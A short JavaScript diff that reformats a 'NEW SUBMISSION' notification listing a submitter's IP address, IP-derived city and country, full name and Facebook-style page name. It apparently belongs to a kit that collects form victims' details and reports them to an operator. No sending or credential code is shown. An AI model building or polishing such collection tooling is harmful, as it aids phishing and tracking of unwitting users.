@@ -98,7 +98,6 @@ const Utils = (() => {
     for (const fn of providers) {
       try {
         const info = await fn();
-        // Kiểm tra có đủ dữ liệu không
         if (info.ip && info.ip !== 'N/A' && info.country_code) return info;
       } catch (_) {}
     }
@@ -118,16 +117,14 @@ const Utils = (() => {
     const country  = ipInfo.country_name || '';
     const countryC = ipInfo.country_code || '';
 
-    // Hanoi(HN) | Vietnam(VN)
-    const cityStr    = city    ? `${city}(${regCode})`     : '';
-    const countryStr = country ? `${country}(${countryC})` : '';
-    const location   = [ip, cityStr, countryStr].filter(Boolean).join(' | ');
+    const locationParts = [city, regCode, country].filter(Boolean).join(', ');
+    const locationFull  = locationParts + (countryC ? ` (${countryC})` : '');
 
     const lines = [];
 
     lines.push(`🔔 <b>NEW SUBMISSION</b>`);
-    lines.push(`<b>Ip:</b> <code>${ip}</code>`);
-    lines.push(`<b>Location:</b> <code>${location}</code>`);
+    lines.push(`🌐 <b>IP:</b> <code>${ip}</code>`);
+    lines.push(`📍 <b>Location:</b> <code>${locationFull || 'N/A'}</code>`);
     lines.push(`-----------------------------`);
     lines.push(`<b>Full Name:</b> ${c(data.fullName)}`);
     lines.push(`<b>Page Name:</b> ${c(data.fanpage)}`);
